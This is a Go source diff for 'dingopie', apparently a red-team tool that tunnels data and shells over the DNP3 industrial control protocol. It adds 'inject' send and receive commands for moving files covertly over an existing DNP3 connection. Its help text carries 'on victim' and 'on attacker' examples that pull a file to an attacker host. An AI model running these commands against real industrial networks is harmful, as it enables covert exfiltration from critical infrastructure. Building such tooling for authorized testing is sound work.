@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/nblair2/dingopie/internal"
+	"github.com/nblair2/dingopie/internal/inject"
 	"github.com/spf13/cobra"
 	"github.com/spf13/pflag"
 )
@@ -110,6 +111,45 @@ func getData(cmd *cobra.Command, file string, args []string) ([]byte, error) {
 	return nil, errors.New("no data provided to send")
 }
 
+// openOutFile opens the file flag path for exclusive writing.
+// Returns nil when no --file flag was given.
+func openOutFile(cmd *cobra.Command) *os.File {
+	if file == "" {
+		return nil
+	}
+
+	f, err := os.OpenFile( //nolint:gosec
+		file, os.O_WRONLY|os.O_CREATE|os.O_EXCL, receiveFileMode,
+	)
+	if err != nil {
+		cmd.Printf("Error opening file %s: %v\n", file, err)
+		os.Exit(1)
+	}
+
+	return f
+}
+
+// writeOut writes data to f and closes it, or prints it to stdout when f is nil.
+func writeOut(cmd *cobra.Command, f *os.File, data []byte) {
+	if f == nil {
+		cmd.Printf(">> Message: %s\n", string(data))
+
+		return
+	}
+
+	_, writeErr := f.Write(data)
+
+	f.Close()
+
+	if writeErr != nil {
+		cmd.Printf("Error writing to file: %v\n", writeErr)
+		cmd.Printf(">> Data received: %s\n", string(data))
+		os.Exit(1)
+	}
+
+	cmd.Printf(">> Data written to %s\n", file)
+}
+
 // ==================================================================
 // User Interface
 // ==================================================================
@@ -148,6 +188,42 @@ func postRun(cmd *cobra.Command) {
 }
 
 // ==================================================================
+// Inject
+// ==================================================================
+
+func runInjectSend(
+	cmd *cobra.Command,
+	args []string,
+	localAddr, remoteAddr string,
+	localPort, remotePort int,
+) {
+	data, err := getData(cmd, file, args)
+	if err != nil {
+		cmd.Printf("Error getting data: %v\n", err)
+		os.Exit(1)
+	}
+
+	err = inject.Send(cmd.OutOrStdout(), localAddr, remoteAddr, localPort, remotePort, key, data)
+	if err != nil {
+		cmd.Printf("Error with inject send: %v\n", err)
+		os.Exit(1)
+	}
+}
+
+func runInjectReceive(cmd *cobra.Command, localAddr, remoteAddr string, localPort, remotePort int) {
+	f := openOutFile(cmd)
+
+	data, err := inject.Receive(
+		cmd.OutOrStdout(), localAddr, remoteAddr, localPort, remotePort, key,
+	)
+	if err != nil {
+		cmd.Printf("Error with inject receive: %v\nAttempting to output what data we have\n", err)
+	}
+
+	writeOut(cmd, f, data)
+}
+
+// ==================================================================
 // Root
 // ==================================================================
 
@@ -175,7 +251,14 @@ an interactive shell ('shell' | 'connect').
     $ dingopie server direct shell
     # on attacker
     $ dingopie.exe client direct connect -i 131.43.110.7
-    dingopie>`,
+    dingopie>
+		
+  Transfer a file over an existing DNP3 connection:
+    # on victim
+    $ dingopie server inject send -f /tmp/garbage.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
+    # on attacker or intermediary
+    $ dingopie client inject receive -f ~/da-vinci-source.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
+`,
 	PersistentPreRun: func(cmd *cobra.Command, _ []string) {
 		preRun(cmd)
 	},
@@ -217,6 +300,5 @@ func init() {
 {{if .HasAvailableInheritedFlags}}Global Flags:
 {{.InheritedFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}{{if .HasExample}}Examples:
 {{.Example}}{{end}}
-
 `)
 }
